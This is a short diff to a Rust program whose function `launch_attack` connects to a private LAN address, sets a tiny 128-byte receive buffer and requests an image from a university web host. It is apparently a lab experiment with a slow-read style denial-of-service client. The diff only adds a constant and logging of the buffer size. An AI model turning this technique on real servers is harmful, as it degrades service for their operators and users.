@@ -21,10 +21,15 @@ fn main() {
 }
 
 fn launch_attack() -> impl Future<Item=(), Error=Error> {
+    const RECV_BUFFER_SIZE: usize = 128;
+
     let socket_addr: SocketAddr = "192.168.27.131:80".parse().unwrap();
     let tcp_stream = TcpStream::connect(&socket_addr).wait().unwrap();
 
-    tcp_stream.set_recv_buffer_size(128usize);
+    tcp_stream.set_recv_buffer_size(RECV_BUFFER_SIZE);
+
+    println!("Changing buffer size to {} bytes", RECV_BUFFER_SIZE);
+    println!("Buffer size actually changed to {} bytes", tcp_stream.recv_buffer_size().unwrap());
 
     let request = Request::get("https://ni.fe.up.pt/images/projects/PKyl13EDPj3HLxF4.png").body(()).unwrap();
     let request = build_http_request(&request);
